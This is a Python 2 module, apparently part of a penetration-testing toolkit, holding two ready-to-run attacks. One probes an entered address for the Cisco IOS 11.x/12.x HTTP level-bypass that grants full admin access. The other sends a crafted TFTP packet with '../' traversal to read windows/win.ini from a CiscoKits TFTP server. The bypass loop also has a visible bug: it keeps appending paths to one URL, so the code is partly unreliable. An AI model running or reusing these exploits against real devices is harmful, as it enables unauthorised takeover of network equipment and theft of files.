import util
import socket, urllib

#
# cisco vulnerabilities
#

# 
# supported vulns
#
def vulnerabilities():
	return [ 'Cisco IOS 11.x/12.x - Full Admin',
			 'CiscoKits TFTP v1.0 - Directory Traversal'
		   ]

#
# run the vuln
#
def run ( run ):
	if run == 1:
		# http://www.exploit-db.com/exploits/20975/
		tmp = vulnerabilities()[run-1]
		print '[dbg] running ',tmp
		while True:
			try:
				ip = raw_input('Enter address: ')
				break
			except:
				print '[-] Error with input.'
				return
		url = 'http://' + ip + '/level/'
		for i in range(16, 100):
			url += str(i) + '/exec/-'
			response = urllib.urlopen(url)
			r = response.read()
			if '200 ok' in r:
				print '[+] Device vulnerable at %s.  Connect to %s for admin.'%(str(i), url)
				return
		print '[-] Sorry: the device at \'%s\' is not vulnerable.'%(ip)
		return
	
	elif run == 2:
		# http://www.exploit-db.com/exploits/17619/
		while True:
			try:
				ip = raw_input('Enter address: ')
				break
			except:
				print '[-] Error with input.'
				return
		
		pkt = '\x00\x01'
		pkt += '../' * 10 + 'windows/win.ini' + '\x00'
		pkt += 'netascii\x00'

		try:
			skt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			skt.settimeout(5)
			skt.sendto(pkt, (ip, 69))
			data = skt.recv(1024)
			skt.close()
		except Exception, j:
			print '[-] Error with host: ', j
			return

		print '[+] Received from device: '
		print data.strip()
